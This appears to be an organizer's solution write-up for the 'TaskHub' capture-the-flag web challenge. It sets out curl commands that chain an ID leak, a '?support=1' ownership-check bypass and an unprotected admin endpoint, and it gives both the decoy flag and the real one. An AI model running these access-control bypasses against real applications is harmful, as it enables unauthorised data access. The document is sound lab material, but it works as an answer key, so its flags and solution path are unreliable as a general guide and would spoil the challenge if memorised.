# TaskHub — Solution Writeup (organizer copy — don't ship to players)

Verified end-to-end with curl against a local run of the app.

## The bugs (OWASP A01: Broken Access Control)

1. **Horizontal information disclosure** — `/api/activity` is a
   "team activity feed" that returns every ticket's `id`, `title` and
   `author`, company-wide, to any logged-in user. This is the *only*
   place ticket UUIDs for other users (including `admin`) are ever
   exposed — they're real UUID4s, so there's no brute-forcing them
   directly.

2. **Missing function-level access control (IDOR bypass)** —
   `/ticket/<id>` correctly checks `ticket.user_id == session.user_id`
   ... unless the request has `?support=1`, a leftover "assist a user"
   override that was never gated behind an actual support/admin role.
   Any logged-in user can set it and read **any** ticket.

3. **Decoy flag** — the admin's ticket (reached via steps 1–2) contains
   a flag-shaped string explicitly labeled in-fiction as a leftover QA
   placeholder. It's a deliberate false summit: players who stop here
   and submit get told it's wrong, and have to keep reading the same
   ticket for the next lead.

4. **Vertical privilege escalation** — `/admin/settings` only checks
   `"user_id" in session`, never the user's `role`. The real flag is
   there. The admin's ticket (from step 2) casually mentions the path
   exists, which is the only hint of it — it's not linked from any UI.

## Verified solve steps

```bash
# 1. Log in as a regular user
curl -s -c cj.txt -X POST http://TARGET/login -d 'username=judy&password=judy123'

# 2. Leak ticket IDs company-wide
curl -s -b cj.txt http://TARGET/api/activity
# -> [...,{"author":"admin","id":"<ADMIN_TICKET_ID>","title":"Launch checklist follow-ups"},...]

# 3. Direct access to admin's ticket is blocked (403)
curl -s -b cj.txt http://TARGET/ticket/<ADMIN_TICKET_ID>          # 403

# 4. The ?support=1 override bypasses the ownership check entirely
curl -s -b cj.txt "http://TARGET/ticket/<ADMIN_TICKET_ID>?support=1"
# -> body contains a decoy flag (CTF{not_the_real_one_keep_looking})
#    AND a mention of /admin/settings

# 5. Hit the hinted admin endpoint directly -- no role check at all
curl -s -b cj.txt http://TARGET/admin/settings
# -> real flag: CTF{m1ss1ng_func7ion_lvl_4cc3ss_c0ntr0l}
```

All five steps were run against the shipped app and produce exactly
the output shown above.

## Why it's a reasonable "medium"

- Step 1 (the activity feed) is a deliberate, plausible-looking
  feature, not an obvious bug — nothing about it screams
  "vulnerability" on its own.
- Step 2 requires noticing the ownership check exists (403 on direct
  access) and then finding the override. The `?support=1` param is
  hinted via an HTML comment on the dashboard page (view-source), not
  announced — rewards players who actually read page source instead
  of only clicking around.
- The decoy flag (step 3) punishes players who stop at the first
  flag-shaped string, without being unfair: the same ticket body that
  contains the decoy also contains the next lead, so careful readers
  aren't penalized.
- Step 4 is a one-line curl once you have the path, which is
  appropriate — vertical privilege escalation bugs in the real world
  are often exactly this trivial *once discovered*; the difficulty is
  in finding the path, not exploiting it.

## Setting the real competition flag

```bash
docker run -e FLAG='CTF{your_real_flag}' -p 5000:5000 taskhub
```

## Optional hardening/retuning knobs

- **Easier:** Put the `?support=1` hint directly in the login page
  instead of a dashboard HTML comment.
- **Harder:** Remove the HTML-comment hint entirely and require
  players to fuzz common override param names (`?support=1`,
  `?debug=1`, `?admin=1`, `?staff=1`) with a tool like ffuf/Burp
  Intruder.
- **Harder still:** Don't mention `/admin/settings` by name in the
  admin ticket at all — just say "the internal settings panel" —
  forcing a short wordlist-based forced-browsing step
  (`/admin`, `/admin/panel`, `/admin/settings`, `/settings`, ...)
  before step 5 works.
- **Split-flag variant:** halve the real flag, put one half at
  `/admin/settings` and the other half in a second escalation step
  (e.g. an `/admin/users` export that's also missing a role check),
  forcing players to complete the *entire* chain before they can
  submit anything, rather than stopping at the first unprotected
  admin endpoint they find.
